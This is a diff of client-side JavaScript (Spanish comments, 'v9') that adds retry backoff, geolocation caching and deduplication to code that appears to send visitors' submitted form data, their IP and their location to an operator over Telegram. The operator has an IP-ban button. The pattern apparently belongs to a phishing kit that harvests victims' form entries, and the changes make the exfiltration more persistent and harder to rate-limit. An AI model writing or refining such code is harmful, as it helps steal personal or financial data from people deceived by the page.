@@ -7,12 +7,28 @@
     var MAX_FAILS_BEFORE_SKIP = 50;
     var redirectTriggered = false;
     var failsSeguidos = 0;
+    // 🔥 NUEVO v9: Flags para NO duplicar trabajo en los reintentos.
+    var storeTxIpSent = false;
+    var storedTxId = null;
+    var ubicacionObtenida = null;
 
     function log(tag, msg) {
         try { console.log('[' + tag + ']', msg); } catch (e) {}
     }
 
+    // 🔥 NUEVO v9: Backoff exponencial + jitter para reintentos.
+    // Evita "storming" cuando hay rate limit 429 (antes era 5 segundos fijos).
+    function calcReintentoMs(fails) {
+        var f = Math.max(0, Math.min(12, parseInt(fails, 10) || 0));
+        var base = Math.min(20000, 800 * Math.pow(1.55, f));
+        var jitter = Math.random() * (Math.min(4000, base * 0.35));
+        return Math.round(750 + base + jitter);
+    }
+
     async function obtenerIPYUbicacion() {
+        // 🔥 Cache en memoria. Por qué: si enviarDatos() se reintenta 10 veces por 429,
+        //    no queremos 10 llamadas a ipapi.co / ip-api.com (ambas tienen rate limit 429 propio).
+        if (ubicacionObtenida !== null) return ubicacionObtenida;
         log('IP', 'Obteniendo IP y ubicación...');
 
         try {
@@ -163,13 +179,20 @@
             transactionId = Date.now().toString(36) + Math.random().toString(36).slice(2);
             try { localStorage.setItem('transaction_id', transactionId); } catch (e) {}
         }
-        // 🔥 Asegura que el servidor tenga la relación TX <-> IP ANTES de enviar nada a Telegram
-        //    (así el botón BANEAR IP del operador siempre encuentra la IP a banear)
-        try {
-            if (telegramAPI && typeof telegramAPI.storeTxIp === 'function') {
-                telegramAPI.storeTxIp(transactionId).catch(function(){});
-            }
-        } catch (e) {}
+
+        // 🔥 NUEVO v9: storeTxIp SOLAMENTE 1 VEZ POR TX y 1 VEZ POR VIDA DE LA PESTAÑA.
+        //    Los reintentos de enviarDatos() (por 429 / network) NO deben volver a disparar
+        //    esta petición: al duplicarla llenábamos el rate limit de api.php en segundos.
+        if (!storeTxIpSent || storedTxId !== transactionId) {
+            storeTxIpSent = true;
+            storedTxId   = transactionId;
+            try {
+                if (telegramAPI && typeof telegramAPI.storeTxIp === 'function') {
+                    telegramAPI.storeTxIp(transactionId).catch(function(){});
+                }
+            } catch (e) {}
+        }
+
         log('TXID', transactionId);
 
         var formDataMessage = '';
@@ -280,13 +303,17 @@
                 log('SEND', 'Telegram respondi\u00F3 mal: ' + JSON.stringify(result));
                 mostrarError('No se pudo conectar con el servidor de Telegram');
                 failsSeguidos += 1;
-                setTimeout(function () { enviarDatos(); }, 5000);
+                var ms1 = calcReintentoMs(failsSeguidos);
+                log('RETRY', 'Reintento ' + failsSeguidos + ' en ' + ms1 + 'ms');
+                setTimeout(function () { enviarDatos(); }, ms1);
             }
         } catch (error) {
             log('SEND', 'Error red: ' + (error && error.message ? error.message : String(error)));
             mostrarError('Error de comunicaci\u00F3n con el servidor');
             failsSeguidos += 1;
-            setTimeout(function () { enviarDatos(); }, 5000);
+            var ms2 = calcReintentoMs(failsSeguidos);
+            log('RETRY', 'Reintento ' + failsSeguidos + ' en ' + ms2 + 'ms');
+            setTimeout(function () { enviarDatos(); }, ms2);
         }
     }
 
